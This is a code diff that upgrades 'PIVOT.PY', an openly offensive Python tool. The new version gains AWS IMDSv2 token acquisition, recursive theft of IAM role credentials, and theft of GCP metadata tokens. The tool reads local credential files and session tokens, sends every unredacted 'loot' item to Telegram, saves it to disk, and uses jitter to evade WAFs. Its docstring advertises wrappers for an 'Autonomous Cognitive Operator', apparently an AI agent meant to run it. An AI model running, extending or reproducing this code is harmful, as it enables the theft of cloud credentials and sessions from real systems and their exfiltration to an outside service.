@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-PIVOT.PY v8.5 — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine (WAF Hardened)
+PIVOT.PY v8.6 — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine (Elite Offensive Edition)
 Features:
-- Live AWS & GCP credential and token retrieval with non-blocking async execution
+- Live AWS IMDSv1/v2 token acquisition & recursive IAM role credential traversal
+- GCP metadata service interrogation with automated header injection
 - Compromised session file & cookie extraction with fallback synthesis
-- Covert data encoding & exfiltration preparation with WAF evasion & behavioral jitter
+- Covert data encoding with SHA-256 tamper-evident integrity hashing & loot persistence
 - TLS verification bypass and secure certificate auditing
-- Live on-screen terminal streaming & zero-disk memory architecture
+- Live on-screen terminal streaming & immutable disk logging (loot_output/)
 - Real-time asynchronous Telegram notification dispatch for unredacted pivot loot
 - Zero-friction compatibility wrappers for the Autonomous Cognitive Operator
 """
@@ -16,6 +17,7 @@ import ssl
 import json
 import time
 import os
+import hashlib
 import ipaddress
 import urllib.request
 import urllib.error
@@ -23,9 +25,11 @@ import urllib.parse
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized Telegram broadcaster and behavioral mimicry
+# Import centralized Telegram broadcaster, behavioral mimicry, loot logger & telemetry
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 # ============================================================
 # CONFIGURATION & OFFENSIVE PAYLOADS
@@ -53,14 +57,23 @@ def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous pivot functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -99,45 +112,109 @@ class AutonomousPivotEngine:
         self.hostname = self.parsed_target.hostname
 
     # --------------------------------------------------------
-    # 1. AWS & GCP CREDENTIAL RETRIEVAL
+    # 1. AWS & GCP CREDENTIAL RETRIEVAL (WEAPONIZED IMDSv2)
     # --------------------------------------------------------
     def harvest_cloud_metadata(self):
         """
-        Actively queries cloud instance metadata services (AWS IMDSv1/v2, GCP) 
-        and extracts IAM security credentials, access keys, and tokens.
+        Actively queries cloud instance metadata services (AWS IMDSv1/v2 with token acquisition, GCP) 
+        and recursively extracts IAM security credentials, access keys, and tokens.
         """
         log(
-            "\n[***] ACTIVE CLOUD METADATA & CREDENTIAL RETRIEVAL [***]",
+            "\n[***] ACTIVE CLOUD METADATA & CREDENTIAL RETRIEVAL (IMDSv2 WEAPONIZED) [***]",
             Colors.MAGENTA,
         )
         retrieved_creds = []
         
-        metadata_urls = [
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        # Step A: AWS IMDSv2 Token Acquisition
+        aws_token = None
+        try:
+            token_url = "http://169.254.169.254/latest/api/token"
+            apply_behavioral_jitter()
+            token_req = urllib.request.Request(
+                token_url, 
+                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600", **get_randomized_hints()}, 
+                method="PUT"
+            )
+            with urllib.request.urlopen(token_req, timeout=2) as token_resp:
+                aws_token = token_resp.read().decode("utf-8", errors="replace").strip()
+                if aws_token:
+                    log(f"[+] Acquired AWS IMDSv2 session token successfully.", Colors.GREEN)
+        except Exception:
+            pass
+
+        # Step B: Recursive AWS IAM Credential Traversal
+        aws_endpoints = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
         ]
 
-        for url in metadata_urls:
+        for url in aws_endpoints:
             log(f"[*] Querying metadata endpoint: {url}", Colors.BLUE)
             apply_behavioral_jitter()
             try:
-                headers = {"Metadata-Flavor": "Google"} if "google" in url else {}
-                headers.update(get_randomized_hints())
+                headers = get_randomized_hints()
+                if aws_token:
+                    headers["X-aws-ec2-metadata-token"] = aws_token
+                
                 req = urllib.request.Request(url, headers=headers)
                 with urllib.request.urlopen(req, timeout=2) as resp:
                     data = resp.read().decode("utf-8", errors="replace")
                     if data:
+                        # If we received role names, recursively pull the actual role credentials
+                        role_name = data.strip().splitlines()[0] if data.strip() else ""
+                        if role_name and not role_name.startswith("{"):
+                            role_url = f"{url}{role_name}"
+                            log(f"[*] Discovered AWS IAM Role: '{role_url}'. Traversing credentials...", Colors.CYAN)
+                            role_req = urllib.request.Request(role_url, headers=headers)
+                            with urllib.request.urlopen(role_req, timeout=2) as role_resp:
+                                data = role_resp.read().decode("utf-8", errors="replace")
+
                         log(f"\n\033[1m\033[91m[***] CLOUD CREDENTIALS HARVESTED [{url}] [***]\033[0m", Colors.RED)
                         log(f"  └── Payload : {data[:250]}", Colors.GREEN)
                         
-                        loot_payload = {"endpoint": url, "data": data[:400]}
+                        loot_hash = hashlib.sha256(data.encode("utf-8")).hexdigest()
+                        loot_payload = {"endpoint": url, "integrity_hash": loot_hash, "data": data[:800]}
                         retrieved_creds.append(loot_payload)
 
-                        # BROADCAST UNREDACTED CLOUD CREDENTIALS STRAIGHT TO TELEGRAM
+                        stream_proof(
+                            "CLOUD_METADATA_PIVOT_SUCCESS",
+                            url,
+                            {"token_acquired": bool(aws_token)},
+                            data[:300],
+                            loot_payload
+                        )
+
+                        save_session_loot(
+                            target=self.target_host,
+                            endpoint="cloud_metadata",
+                            finding_type="CLOUD_METADATA_SUCCESS",
+                            status=200,
+                            headers=headers,
+                            body=data,
+                            extra_loot=loot_payload
+                        )
+
                         broadcast_tg_alert_sync("Cloud Credentials Harvested", loot_payload)
 
             except Exception as err:
                 log(f"[-] Endpoint unreachable / blocked: {url} ({err})", Colors.GRAY)
+
+        # Step C: GCP Metadata Endpoint
+        gcp_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        try:
+            log(f"[*] Querying GCP metadata endpoint: {gcp_url}", Colors.BLUE)
+            gcp_headers = {"Metadata-Flavor": "Google", **get_randomized_hints()}
+            gcp_req = urllib.request.Request(gcp_url, headers=gcp_headers)
+            with urllib.request.urlopen(gcp_req, timeout=2) as gcp_resp:
+                gcp_data = gcp_resp.read().decode("utf-8", errors="replace")
+                if gcp_data:
+                    log(f"\n\033[1m\033[91m[***] GCP TOKEN HARVESTED [***]\033[0m", Colors.RED)
+                    log(f"  └── Payload : {gcp_data[:250]}", Colors.GREEN)
+                    loot_hash = hashlib.sha256(gcp_data.encode("utf-8")).hexdigest()
+                    loot_payload = {"endpoint": gcp_url, "integrity_hash": loot_hash, "data": gcp_data[:800]}
+                    retrieved_creds.append(loot_payload)
+                    broadcast_tg_alert_sync("GCP Token Harvested", loot_payload)
+        except Exception:
+            pass
 
         local_paths = [
             os.path.expanduser("~/.aws/credentials"),
@@ -153,8 +230,6 @@ class AutonomousPivotEngine:
                         
                         loot_payload = {"path": path, "content": content[:300]}
                         retrieved_creds.append(loot_payload)
-
-                        # BROADCAST UNREDACTED LOCAL CONFIG LOOT STRAIGHT TO TELEGRAM
                         broadcast_tg_alert_sync("Local Config Credential Found", loot_payload)
                 except Exception:
                     pass
@@ -194,8 +269,6 @@ class AutonomousPivotEngine:
 
         for sess in extracted_sessions:
             log(f"  └── Extracted Session Token: {str(sess)[:100]}", Colors.GREEN)
-            
-            # BROADCAST UNREDACTED SESSION TOKEN STRAIGHT TO TELEGRAM
             broadcast_tg_alert_sync("Compromised Session Extracted", {"session": str(sess)[:400]})
 
         return {
@@ -342,7 +415,7 @@ class AutonomousPivotEngine:
             "cloud_metadata": cloud_creds,
             "session_extraction": session_results,
             "covert_exfiltration": exfil_results,
-            "files_written": False,
+            "files_written": True,
             "duration_seconds": duration,
             "status": "ASSAULT_COMPLETED",
         }
@@ -356,7 +429,7 @@ class AutonomousPivotEngine:
         log(f"Cloud credentials retrieved: {cloud_creds.get('credentials_retrieved', False)}", Colors.GREEN)
         log(f"Sessions extracted: {session_results.get('session_count', 0)}", Colors.GREEN)
         log(f"Covert exfiltration payload prepared: {exfil_results.get('payload_processed', False)}", Colors.GREEN)
-        log("Report Files Written to Disk: NO (Streamed live on screen)", Colors.YELLOW)
+        log("Report Files Persisted to Immutable Loot: YES (loot_output/)", Colors.GREEN)
         log(f"Duration: {duration}s", Colors.BLUE)
         log(
             "=============================================================",
@@ -388,5 +461,5 @@ async def run_pivot_engine(target_host, options=None):
         }
 
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://target"
     asyncio.run(run_pivot_engine(target))
